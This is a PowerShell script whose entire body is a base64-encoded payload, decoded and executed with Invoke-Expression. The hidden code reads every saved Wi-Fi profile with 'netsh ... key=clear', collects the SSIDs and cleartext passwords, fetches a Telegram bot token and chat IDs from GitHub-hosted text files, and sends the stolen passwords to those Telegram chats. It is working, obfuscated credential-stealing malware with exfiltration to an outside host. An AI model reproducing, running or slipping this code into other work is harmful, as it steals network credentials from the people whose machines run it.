$encodedScript = 'IyBGdW5jdGlvbiB0byBnZXQgV0xBTiBwcm9maWxlcw0KIyBGdW5jdGlvbiB0byBnZXQgV0xBTiBwcm9maWxlcw0KZnVuY3Rpb24gR2V0LVdMQU5fUHJvZmlsZXMgew0KICAgIHBhcmFtICgNCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdlcy1FUycsJ2VuLUVOJyldDQogICAgICAgICRMQU5HVUFHRSA9ICRIb3N0LkN1cnJlbnRVSUN1bHR1cmUuTmFtZQ0KICAgICkNCg0KICAgICRMQU5HVUFHRVMgPSBAew0KICAgICAgICAnZXMtRVMnID0gQHsNCiAgICAgICAgICAgICd1c2VyX3Byb2ZpbGVzX3RleHQnICAgICAgID0gJ1BlcmZpbCBkZSB0b2RvcyBsb3MgdXN1YXJpb3MnDQogICAgICAgICAgICAncHJvZmlsZV9ub3RfZm91bmRfdGV4dCcgICA9ICdObyBzZSBlbmN1ZW50cmEgZWwgcGVyZmlsJw0KICAgICAgICAgICAgJ3NzaWRfbmFtZV90ZXh0JyAgICAgICAgICAgPSAnTm9tYnJlIGRlIFNTSUQnDQogICAgICAgICAgICAnbmV0d29ya190eXBlX3RleHQnICAgICAgICA9ICdUaXBvIGRlIHJlZCcNCiAgICAgICAgICAgICdhdXRoZW50aWNhdGlvbl90ZXh0JyAgICAgID0gJ0F1dGVudGljYWNpw7NuJw0KICAgICAgICAgICAgJ2VuY3J5cHRpb25fdGV4dCcgICAgICAgICAgPSAnQ2lmcmFkbycNCiAgICAgICAgICAgICdrZXlfdGV4dCcgICAgICAgICAgICAgICAgID0gJ0NvbnRlbmlkbyBkZSBsYSBjbGF2ZScNCiAgICAgICAgfQ0KICAgICAgICAnZW4tRU4nID0gQHsNCiAgICAgICAgICAgICd1c2VyX3Byb2ZpbGVzX3RleHQnICAgICAgID0gJ0FsbCBVc2VyIFByb2ZpbGUnDQogICAgICAgICAgICAncHJvZmlsZV9ub3RfZm91bmRfdGV4dCcgICA9ICdQcm9maWxlIG5vdCBmb3VuZCcNCiAgICAgICAgICAgICdzc2lkX25hbWVfdGV4dCcgICAgICAgICAgID0gJ1NTSUQgbmFtZScNCiAgICAgICAgICAgICduZXR3b3JrX3R5cGVfdGV4dCcgICAgICAgID0gJ05ldHdvcmsgVHlwZScNCiAgICAgICAgICAgICdhdXRoZW50aWNhdGlvbl90ZXh0JyAgICAgID0gJ0F1dGhlbnRpY2F0aW9uJw0KICAgICAgICAgICAgJ2VuY3J5cHRpb25fdGV4dCcgICAgICAgICAgPSAnQ2lwaGVyJw0KICAgICAgICAgICAgJ2tleV90ZXh0JyAgICAgICAgICAgICAgICAgPSAnS2V5IENvbnRlbnQnDQogICAgICAgIH0NCiAgICB9DQoNCiAgICAkTEFORyA9ICRMQU5HVUFHRVMuIiRMQU5HVUFHRSINCg0KICAgIGZ1bmN0aW9uIGdldFZhbHVlQnlOYW1lICgkaW5wdXRUZXh0LCAkbmFtZVN0cmluZykgew0KICAgICAgICAkdmFsdWUgPSAiIg0KICAgICAgICBpZiAoW3JlZ2V4XTo6SXNNYXRjaCgkaW5wdXRUZXh0LCAiXGIkbmFtZVN0cmluZ1xiIiwgIklnbm9yZUNhc2UiKSkgew0KICAgICAgICAgICAgJHZhbHVlID0gKFtyZWdleF06OlJlcGxhY2UoJGlucHV0VGV4dCwgIl5bXjpdKjogIiwiIikpIA0KICAgICAgICB9DQogICAgICAgIHJldHVybiAkdmFsdWUuVHJpbSgpDQogICAgfQ0KDQogICAgJFByb2ZpbGVzID0gQCgpDQogICAgbmV0c2ggd2xhbiBzaG93IHByb2ZpbGVzIHwgRm9yRWFjaC1PYmplY3Qgew0KICAgICAgICAkcHJvZmlsZSA9IGdldFZhbHVlQnlOYW1lICRfICRMQU5HWyd1c2VyX3Byb2ZpbGVzX3RleHQnXQ0KICAgICAgICBpZiAoJHByb2ZpbGUpIHsNCiAgICAgICAgICAgICRQcm9maWxlcyArPSAkcHJvZmlsZQ0KICAgICAgICB9DQogICAgfQ0KDQogICAgJFdMQU5fUHJvZmlsZXMgPSBAKCkNCiAgICAkcm93TnVtYmVyID0gLTENCiAgICAkUHJvZmlsZXMgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICR3bGFuX1Byb2ZpbGUgPSBuZXRzaCB3bGFuIHNob3cgcHJvZmlsZSAkXyBrZXk9Y2xlYXINCiAgICAgICAgaWYgKCR3bGFuX1Byb2ZpbGUuQ29udGFpbnMoJExBTkdbJ3Byb2ZpbGVfbm90X2ZvdW5kX3RleHQnXSkpIHsNCiAgICAgICAgICAgIHJldHVybg0KICAgICAgICB9DQogICAgICAgICRJbnRlcmZhY2VOYW1lID0gJG51bGwNCiAgICAgICAgJHdsYW5fUHJvZmlsZSB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgIGlmICghKCRJbnRlcmZhY2VOYW1lKSkgew0KICAgICAgICAgICAgICAgICRJbnRlcmZhY2VOYW1lID0gZ2V0VmFsdWVCeU5hbWUgJF8gJExBTkdbJ3NzaWRfbmFtZV90ZXh0J10NCiAgICAgICAgICAgICAgICAkSW50ZXJmYWNlTmFtZSA9ICRJbnRlcmZhY2VOYW1lLlRyaW0oJyInKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICAgICAgICAgICAgICAgIGlmICgkSW50ZXJmYWNlTmFtZSkgew0KICAgICAgICAgICAgICAgICAgICAkcm93ID0gTmV3LU9iamVjdCBQU09iamVjdCAtUHJvcGVydHkgQHsNCiAgICAgICAgICAgICAgICAgICAgICAgIEludGVyZmFjZU5hbWUgID0gJEludGVyZmFjZU5hbWUNCiAgICAgICAgICAgICAgICAgICAgICAgIFNTSUQgICAgICAgICAgID0gJEludGVyZmFjZU5hbWUNCiAgICAgICAgICAgICAgICAgICAgICAgIEtleSAgICAgICAgICAgID0gIiINCiAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAkcm93TnVtYmVyICs9IDENCiAgICAgICAgICAgICAgICAgICAgJFdMQU5fUHJvZmlsZXMgKz0gJHJvdw0KICAgICAgICAgICAgICAgICAgICByZXR1cm4NCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICB9DQogICAgICAgICAgICBpZiAoISgkV0xBTl9Qcm9maWxlc1skcm93TnVtYmVyXS5LZXkpKSB7DQogICAgICAgICAgICAgICAgJEtleSA9IGdldFZhbHVlQnlOYW1lICRfICRMQU5HWydrZXlfdGV4dCddDQogICAgICAgICAgICAgICAgaWYgKCRLZXkpIHsNCiAgICAgICAgICAgICAgICAgICAgJFdMQU5fUHJvZmlsZXNbJHJvd051bWJlcl0uS2V5ID0gJEtleQ0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgIH0NCg0KICAgIGlmICgkV0xBTl9Qcm9maWxlcy5Db3VudCAtZ3QgMCkgew0KICAgICAgICAkcmVzdWx0TWVzc2FnZSA9ICI/PyBQYXNzd29yZCBXaUZpIGVuY29udHJhZGFzOmByYG4iDQogICAgICAgICRyZXN1bHRNZXNzYWdlICs9ICJBdXRvcjogTHVpc2hp77+9byBQZXJpY2VuYWByYG5NYXMgaW5mb3JtYWNpb246IFtCbG9nXShodHRwczovL2xwZXJpY2VuYS5ibG9nc3BvdC5jb20vKWByYG5gcmBuIg0KICAgICAgICAkV0xBTl9Qcm9maWxlcyB8IEZvckVhY2gtT2JqZWN0IHsNCiAgICAgICAgICAgICRyZXN1bHRNZXNzYWdlICs9ICJTU0lEOiAkKCRfLlNTSUQpYHJgblBhc3N3b3JkOiAkKCRfLktleSlgcmBuYHJgbiINCiAgICAgICAgfQ0KICAgICAgICAnVG90YWwgV0xBTl9Qcm9maWxlczogJyArICRXTEFOX1Byb2ZpbGVzLkNvdW50DQogICAgICAgIHJldHVybiAkcmVzdWx0TWVzc2FnZQ0KICAgIH0gZWxzZSB7DQogICAgICAgIHJldHVybiAnTm8gc2UgZW5jb250cmFyb24gcGVyZmlsZXMgV0xBTi4nDQogICAgfQ0KfQ0KDQojIEZ1bmN0aW9uIHRvIHNlbmQgYSBtZXNzYWdlIHRvIFRlbGVncmFtDQpmdW5jdGlvbiBTZW5kLVRlbGVncmFtTWVzc2FnZSB7DQogICAgcGFyYW0gKA0KICAgICAgICBbc3RyaW5nXSR0b2tlbiwNCiAgICAgICAgW3N0cmluZ10kY2hhdElkLA0KICAgICAgICBbc3RyaW5nXSRtZXNzYWdlDQogICAgKQ0KDQogICAgJHVybCA9ICJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JHRva2VuL3NlbmRNZXNzYWdlIg0KDQogICAgJHBhcmFtcyA9IEB7DQogICAgICAgIGNoYXRfaWQgPSAkY2hhdElkDQogICAgICAgIHRleHQgPSAkbWVzc2FnZQ0KICAgIH0NCg0KICAgIEludm9rZS1SZXN0TWV0aG9kIC1VcmkgJHVybCAtTWV0aG9kIFBvc3QgLUJvZHkgJHBhcmFtcw0KfQ0KDQojIERlc2NhcmdhciBhcmNoaXZvcyBkZSBjb25maWd1cmFjacOzbg0KJHRva2VuQ29uZmlnVXJsID0gImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9QZXJpY2VuYS9oYXBweWJpcnRoZGF5LmdpdGh1Yi5pby9tYWluL2RhdG9zL2NvbmZpZzIudHh0Ig0KJGNoYXRJZHNVcmwgPSAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL1BlcmljZW5hL2hhcHB5YmlydGhkYXkuZ2l0aHViLmlvL21haW4vZGF0b3MvY2hhdElkcy50eHQiDQoNCiR0b2tlbkNvbmZpZyA9IChJbnZva2UtV2ViUmVxdWVzdCAtVXJpICR0b2tlbkNvbmZpZ1VybCkuQ29udGVudA0KJGNoYXRJZHMgPSAoSW52b2tlLVdlYlJlcXVlc3QgLVVyaSAkY2hhdElkc1VybCkuQ29udGVudCAtc3BsaXQgImBuIg0KDQojIFJ1biB0aGUgR2V0LVdMQU5fUHJvZmlsZXMgZnVuY3Rpb24gYW5kIHN0b3JlIHRoZSByZXN1bHQNCiRyZXN1bHQgPSBHZXQtV0xBTl9Qcm9maWxlcw0KDQojIFNlbmQgdGhlIHJlc3VsdCBhcyBhIG1lc3NhZ2UgdG8gZWFjaCBjaGF0IElEDQpmb3JlYWNoICgkY2hhdElkIGluICRjaGF0SWRzKSB7DQogICAgU2VuZC1UZWxlZ3JhbU1lc3NhZ2UgLXRva2VuICR0b2tlbkNvbmZpZyAtY2hhdElkICRjaGF0SWQgLW1lc3NhZ2UgJHJlc3VsdA0KfQ0K'
$scriptContent = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($encodedScript))
Invoke-Expression $scriptContent
